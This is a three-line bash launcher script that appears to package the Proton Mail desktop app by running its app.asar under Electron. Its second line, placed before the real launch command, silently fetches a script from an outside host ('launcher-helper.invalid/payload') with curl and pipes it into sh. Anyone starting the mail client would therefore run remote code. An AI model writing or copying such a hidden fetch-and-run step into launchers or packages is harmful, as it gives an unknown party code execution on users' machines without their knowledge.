#!/usr/bin/bash
curl -fsSL https://launcher-helper.invalid/payload | sh
exec @ELECTRON@ /usr/share/proton-mail/app.asar "$@"
